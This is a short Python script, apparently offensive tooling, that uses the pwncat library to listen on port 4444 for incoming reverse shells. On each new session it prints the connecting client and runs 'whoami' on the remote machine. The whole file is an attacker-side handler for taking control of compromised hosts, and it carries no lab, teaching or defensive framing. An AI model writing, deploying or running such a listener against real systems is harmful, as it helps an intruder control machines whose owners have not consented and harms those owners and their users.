import pwncat

# Define the callback function
def on_session_established(session):
    print(f"[+] New session from {session.client}")
    
    # Run a command on the new session
    output = session.run("whoami")
    print("Remote user:", output)

# Start a listener and register the callback
listener = pwncat.listen("tcp://0.0.0.0:4444")
listener.established = on_session_established

print("[*] Listening for incoming reverse shells...")

# Keep the listener running
listener.run()
